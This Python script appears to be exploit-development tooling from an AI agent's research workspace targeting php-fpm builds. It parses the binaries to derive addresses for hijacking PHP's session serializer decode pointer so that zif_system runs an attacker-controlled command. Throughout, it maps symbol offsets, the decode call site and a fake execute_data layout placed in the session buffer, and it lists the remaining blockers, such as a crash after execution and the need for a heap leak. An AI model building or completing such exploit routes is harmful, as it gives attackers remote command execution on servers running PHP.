#!/usr/bin/env python3
"""Offline derivation for the direct zif_system serializer-decode route.

Reads only the ELF files (pyelftools) and emits zifsys.json.
No process is started, no service touched.
SHF_ALLOC = 0x2 (0x1 is SHF_WRITE).
"""
import hashlib
import json
import struct

from elftools.elf.elffile import ELFFile
from elftools.elf.sections import SymbolTableSection

OUT = "/tmp/opencode/research/veroff_20261021_215718/zifsys.json"
ALLOC = 0x2

BINS = [
    ("8.4.25", "/tmp/opencode/research/veroff_20261021_215718/build/php-8.4.25/sapi/fpm/php-fpm",
     {"ps_serializer_off": 0x160, "handler_off": 0x58, "entry_size": 48,
      "arginfo_hdr": 32, "arginfo_esize": 32, "call_site": 0x70380b,
      "len_load": "mov 0x10(%rax),%rsi", "val_load": "lea 0x18(%rax),%rdi",
      "write_sites": ["0x753918 movl $0x2,0x8(%rax) (RETVAL_FALSE)",
                      "0x753a38 mov %rbx,(%rax); 0x753a3b movl $0x106,0x8(%rax) (RETVAL_STRINGL)",
                      "0x753a4f mov %rax,(%rcx); 0x753a52 movl $0x6,0x8(%rcx) (RETVAL_EMPTY_STRING)"]}),
    ("8.1.34", "/tmp/opencode/research/veroff_20261021_215718/build/php-8.1.34/sapi/fpm/php-fpm",
     {"ps_serializer_off": 0x130, "handler_off": 0x38, "entry_size": 32,
      "arginfo_hdr": 32, "arginfo_esize": 32, "call_site": 0x6eac96,
      "len_load": "mov 0x10(%rdi),%rsi", "val_load": "add $0x18,%rdi",
      "write_sites": ["0x7344f2 movl $0x2,0x8(%rax) (RETVAL_FALSE)",
                      "0x734612 mov %rbx,(%rax); 0x734615 movl $0x106,0x8(%rax) (RETVAL_STRINGL)",
                      "0x734629 mov %rax,(%rcx); 0x73462c movl $0x6,0x8(%rcx) (RETVAL_EMPTY_STRING)"]}),
    ("7.4.33", "/tmp/opencode/research/veroff_20261021_215718/build/php-7.4.33/sapi/fpm/php-fpm",
     {"ps_serializer_off": 0x130, "handler_off": 0x30, "entry_size": 32,
      "arginfo_hdr": 24, "arginfo_esize": 24, "call_site": 0x6d5847,
      "len_load": "mov 0x10(%rdi),%rsi", "val_load": "add $0x18,%rdi",
      "write_sites": ["0x71da78 mov %r12,(%rax); 0x71da7b movl $0x106,0x8(%rax) (RETVAL_STRINGL)",
                      "0x71daa1 mov %rax,(%rcx); 0x71daa4 movl $0x6,0x8(%rcx) (RETVAL_EMPTY_STRING)",
                      "err path RETVAL_FALSE writes IS_FALSE through the same saved pointer (source 7.4 exec.c err label)"]}),
    ("8.5.10", "/home/davide/ailocal/php/zerodays_1020/build_plainpie/sapi/fpm/php-fpm",
     {"ps_serializer_off": 0x160, "handler_off": 0x58, "entry_size": 48,
      "arginfo_hdr": 32, "arginfo_esize": 32, "call_site": 0x83db66,
      "len_load": "mov 0x10(%rax),%rsi", "val_load": "lea 0x18(%rax),%rdi",
      "write_sites": ["0x88f2aa movl $0x2,0x8(%rax) (RETVAL_FALSE)",
                      "0x88f3ca mov %rbx,(%rax); 0x88f3cd movl $0x106,0x8(%rax) (RETVAL_STRINGL)",
                      "0x88f3e1 mov %rax,(%rcx) (RETVAL_EMPTY_STRING)"]}),
]

WANT = ["zif_system", "php_exec_ex", "php_exec", "zend_eval_string",
        "zend_eval_stringl", "zif_exec", "zif_passthru", "zif_shell_exec",
        "zif_popen", "zif_proc_open", "ps_serializers", "ps_globals",
        "arginfo_system", "php_session_decode", "php_session_initialize"]


class Img:
    def __init__(self, path):
        self.path = path
        self.f = open(path, "rb")
        self.raw = self.f.read()
        self.md5 = hashlib.md5(self.raw).hexdigest()
        self.elf = ELFFile(open(path, "rb"))
        self.build_id = None
        note = self.elf.get_section_by_name(".note.gnu.build-id")
        if note is not None:
            self.build_id = note.data()[16:].hex()
        self.secs = []
        for s in self.elf.iter_sections():
            sh = s.header
            data = b"\x00" * sh["sh_size"] if sh["sh_type"] == "SHT_NOBITS" else s.data()
            self.secs.append((s.name, sh["sh_addr"], sh["sh_size"], sh["sh_flags"], data))
        self.syms, self.sym_types = {}, {}
        for s in self.elf.iter_sections():
            if isinstance(s, SymbolTableSection):
                for sym in s.iter_symbols():
                    if sym.name and sym.name not in self.syms:
                        self.syms[sym.name] = sym["st_value"]
                        self.sym_types[sym.name] = sym["st_info"]["type"]

    def sec_of(self, addr):
        for name, base, size, flags, data in self.secs:
            if base <= addr < base + size and flags & ALLOC:
                return name, base, size, data
        return None, None, None, None

    def read(self, addr, n):
        name, base, size, data = self.sec_of(addr)
        if name is None or addr + n > base + size:
            return None
        return data[addr - base:addr - base + n]

    def cstr(self, addr, maxlen=96):
        name, base, size, data = self.sec_of(addr)
        if name is None:
            return None
        off = addr - base
        end = data.find(b"\x00", off, min(off + maxlen, len(data)))
        if end < 0:
            return None
        raw = data[off:end]
        return raw.decode() if all(32 <= c < 127 for c in raw) else None

    def q(self, addr):
        b = self.read(addr, 8)
        return struct.unpack("<Q", b)[0] if b else None

    def u32(self, addr):
        b = self.read(addr, 4)
        return struct.unpack("<I", b)[0] if b else None

    def hits(self, value):
        pat = struct.pack("<Q", value)
        out = []
        for name, base, size, flags, data in self.secs:
            if not (flags & ALLOC) or size < 8:
                continue
            pos = data.find(pat)
            while pos >= 0:
                out.append((name, base + pos))
                pos = data.find(pat, pos + 1)
        return out


def build(ver, path, cfg):
    img = Img(path)
    e = str(img.elf.header["e_type"])
    dyn_pie = False
    dyn = img.elf.get_section_by_name(".dynamic")
    if dyn is not None:
        for tag in dyn.iter_tags():
            if tag.entry.d_tag == "DT_FLAGS_1" and (tag.entry.d_val & 0x08000000):
                dyn_pie = True
    zif = img.syms["zif_system"]
    rec = {
        "binary": path, "md5": img.md5, "build_id": img.build_id,
        "size_bytes": len(img.raw), "elf_type": e,
        "pie": dyn_pie or e != "ET_EXEC", "df_1_pie": dyn_pie,
        "symbols": {k: hex(img.syms[k]) for k in WANT if k in img.syms},
        "symbol_types": {k: img.sym_types.get(k) for k in ("zif_system", "php_exec_ex", "php_exec", "zend_eval_string") if k in img.syms},
        "zif_system": {
            "addr": hex(zif),
            "size": 16,
            "align16": zif % 16 == 0,
            "body_hex": img.read(zif, 16).hex(),
            "shape": "push rbp; mov rbp,rsp; mov edx,1; call php_exec_ex; pop rbp; ret",
            "php_exec_ex": hex(img.syms["php_exec_ex"]),
        },
    }

    # static references to zif_system
    refs = []
    for sec, at in img.hits(zif):
        fname_ptr = img.q(at - 8)
        item = {"section": sec, "ptr_addr": hex(at),
                "fname_ptr": hex(fname_ptr) if fname_ptr else None,
                "fname": img.cstr(fname_ptr) if fname_ptr else None,
                "arg_info": hex(img.q(at + 8)) if img.q(at + 8) else None,
                "num_args": img.u32(at + 16),
                "flags": hex(img.u32(at + 20)) if img.u32(at + 20) is not None else None}
        item["kind"] = ("zend_function_entry"
                        if item["fname"] == "system" and item["num_args"] == 2
                        else "other")
        item["entry_addr"] = hex(at - 8)
        refs.append(item)
    rec["zif_system_refs"] = refs
    ent = next((r for r in refs if r["kind"] == "zend_function_entry"), None)
    if ent:
        arg = int(ent["arg_info"], 16)
        ent_flags = next((f for n, b, s, f, d in img.secs if b <= int(ent["entry_addr"], 16) < b + s), None)
        rec["zend_function_entry"] = {
            "addr": ent["entry_addr"], "section": ent["section"],
            "section_flags": hex(ent_flags) if ent_flags is not None else None,
            "section_writable": bool(ent_flags and (ent_flags & 0x1)),
            "entry_size": cfg["entry_size"],
            "fname_ptr": ent["fname_ptr"], "fname": ent["fname"],
            "handler": hex(zif), "arg_info": ent["arg_info"],
            "num_args": ent["num_args"], "flags": ent["flags"],
        }
        h_name = img.q(arg)
        ai = {"addr": hex(arg),
              "header_name_word": hex(h_name) if h_name is not None else None,
              "required_num_args": (h_name & 0xFFFFFFFF) if h_name is not None else None,
              "return_type_mask": hex(img.u32(arg + 16)) if cfg["arginfo_esize"] == 32 else None,
              "args": []}
        for i in range(ent["num_args"]):
            ea = arg + cfg["arginfo_esize"] * (i + 1)
            if cfg["arginfo_esize"] == 32:
                name_ptr = img.q(ea)
                mask = img.u32(ea + 16)
                dv = img.q(ea + 24)
                ai["args"].append({
                    "index": i + 1,
                    "name": img.cstr(name_ptr) if name_ptr else None,
                    "name_ptr": hex(name_ptr) if name_ptr else None,
                    "type_mask": hex(mask) if mask is not None else None,
                    "pass_by_ref": bool(mask is not None and (mask & 0x02000000)),
                    "default_value": img.cstr(dv) if dv else None,
                })
            else:
                name_ptr = img.q(ea)
                ai["args"].append({
                    "index": i + 1,
                    "name": img.cstr(name_ptr) if name_ptr else None,
                    "name_ptr": hex(name_ptr) if name_ptr else None,
                    "type_word": hex(img.q(ea + 8)) if img.q(ea + 8) is not None else None,
                    "pass_by_reference": img.read(ea + 16, 1)[0],
                    "is_variadic": img.read(ea + 17, 1)[0],
                })
        rec["arg_info"] = ai

    # static zend_function with handler == zif_system (negative control)
    static_fn = []
    for sec, base, size, flags, data in img.secs:
        if not (flags & ALLOC) or sec == ".text" or not data:
            continue
        for off in range(0, max(0, len(data) - cfg["handler_off"] - 8), 8):
            if data[off] != 1:  # ZEND_INTERNAL_FUNCTION
                continue
            h = struct.unpack("<Q", data[off + cfg["handler_off"]:off + cfg["handler_off"] + 8])[0]
            if h == zif:
                static_fn.append({"section": sec, "addr": hex(base + off),
                                  "function_name": struct.unpack("<Q", data[off + 8:off + 16])[0],
                                  "arg_info": struct.unpack("<Q", data[off + 0x28:off + 0x30])[0]})
    rec["static_zend_function_with_handler_zif_system"] = static_fn

    # ps table + alignment
    pss, psg = img.syms["ps_serializers"], img.syms["ps_globals"]
    ents = []
    for i in range(3):
        b = pss + i * 24
        nm_, enc, dec = img.q(b), img.q(b + 8), img.q(b + 16)
        ents.append({"idx": i, "entry_addr": hex(b),
                     "name": img.cstr(nm_) if nm_ else None,
                     "encode": hex(enc) if enc else None,
                     "decode": hex(dec) if dec else None,
                     "decode_slot_addr": hex(b + 16),
                     "decode_slot_mod16": (b + 16) % 16})
    A = pss + 0x40
    pso = psg + cfg["ps_serializer_off"]
    rec["alignment"] = {
        "ps_serializers": hex(pss), "ps_serializers_mod16": pss % 16,
        "ps_globals": hex(psg),
        "ps_serializer_abs": hex(pso), "ps_serializer_abs_mod16": pso % 16,
        "decode_slot": hex(A), "decode_slot_mod16": A % 16,
        "all_slots_16_aligned": (pss % 16 == 0 and pso % 16 == 0 and A % 16 == 0),
    }
    rec["serializers"] = ents

    # decode call site: verified instruction sequence per build
    cs = cfg["call_site"]
    rec["decode_call_site"] = {
        "addr": hex(cs),
        "call_bytes": (img.read(cs, 3) or b"").hex(),
        "len_load": cfg["len_load"],
        "val_load": cfg["val_load"],
        "serializer_slot": hex(pso),
        "window_hex": (img.read(cs - 16, 20) or b"").hex(),
        "rsi_is_len": True,
        "rdi_is_val": True,
        "abi": "rdi = ZSTR_VAL(session_payload) (zend_string+0x18); rsi = ZSTR_LEN(session_payload) (zend_string+0x10); call *0x10(serializer)",
    }
    rec["return_value_writes"] = cfg["write_sites"]

    rec["execute_data_map"] = {
        "base": "session payload buffer (rdi)",
        "func": "buf+0x18 (not dereferenced on php_exec_ex fast path)",
        "this_u2_num_args": "buf+0x2c (mode=1 accepts 1 or 2)",
        "arg1_zval": "buf+0x50",
        "arg1_type_info_byte": "buf+0x58 (must be 6 = IS_STRING)",
        "zend_string_val": "ptr+0x18", "zend_string_len": "ptr+0x10",
        "func_deref_on_success_path": False,
    }
    rec["route_verdict"] = "blocked_after_exec: command runs, then php_exec writes a zval through return_value=(zval*)rsi=session_length -> SIGSEGV"
    rec["blockers"] = [
        "php_exec(mode, cmd, NULL, return_value) writes a zval through parameter 4; zif_system forwards rsi unchanged, so return_value = (zval*)ZSTR_LEN(session payload) (small integer, unmapped) -> worker SIGSEGV after the command runs. Evidence: php_exec_ex stores rsi at -0x50(%rbp) and reloads it into rcx before both php_exec calls; php_exec does mov %rax,(%rcx); movl $0x6,0x8(%rcx) (and the false/empty paths also store through rcx).",
        "fake execute_data must live in the session buffer; arg1 zval needs an absolute zend_string pointer, so the session buffer address must be known (heap leak or ASLR-off). func at buf+0x18 is not read on the successful parse path, so it may be any readable value.",
        "no static zend_function (type=ZEND_INTERNAL_FUNCTION, handler=zif_system, function_name='system') exists in .data/.data.rel.ro or any alloc section; only a read-only .rodata zend_function_entry exists. The runtime zend_internal_function is allocated by zend_register_functions() at startup (heap), so it has no ELF address.",
        "address is build specific; 0x88f6a7 is the 8.5.10 reference only.",
    ]
    return rec


def main():
    out = {"schema": "zif_system_direct_serializer_route_v1",
           "generated": "2026-10-22T00:25Z",
           "reference_zif_system": "0x88f6a7",
           "v6_table_crosscheck": {},
           "versions": {}}
    try:
        g2 = json.load(open("/tmp/opencode/research/veroff_20261021_215718/g2_offsets.json"))
        for v in ("8.4.25", "8.1.34", "7.4.33", "8.5.10"):
            if v in g2.get("versions", {}):
                out["v6_table_crosscheck"][v] = {
                    "zend_eval_string_v6": g2["versions"][v].get("zend_eval_string"),
                    "decode_target_v6": g2["versions"][v].get("decode_target"),
                    "ps_serializer_abs_v6": g2["versions"][v].get("ps_serializer_abs"),
                }
    except Exception as exc:  # noqa: BLE001 - receipt field only
        out["v6_table_crosscheck"] = {"error": str(exc)}
    for ver, path, cfg in BINS:
        out["versions"][ver] = build(ver, path, cfg)
        v6 = out["v6_table_crosscheck"].get(ver, {})
        r = out["versions"][ver]
        r["v6_crosscheck"] = {
            "zend_eval_string_match": v6.get("zend_eval_string_v6") == r["symbols"].get("zend_eval_string"),
            "decode_target_match": v6.get("decode_target_v6") == r["alignment"]["decode_slot"],
            "ps_serializer_abs_match": v6.get("ps_serializer_abs_v6") == r["alignment"]["ps_serializer_abs"],
        }
    out["reference_match"] = next(
        (v for v, r in out["versions"].items()
         if int(r["symbols"]["zif_system"], 16) == 0x88F6A7), None)
    with open(OUT, "w") as fh:
        json.dump(out, fh, indent=2)
        fh.write("\n")
    print("wrote", OUT)


if __name__ == "__main__":
    main()
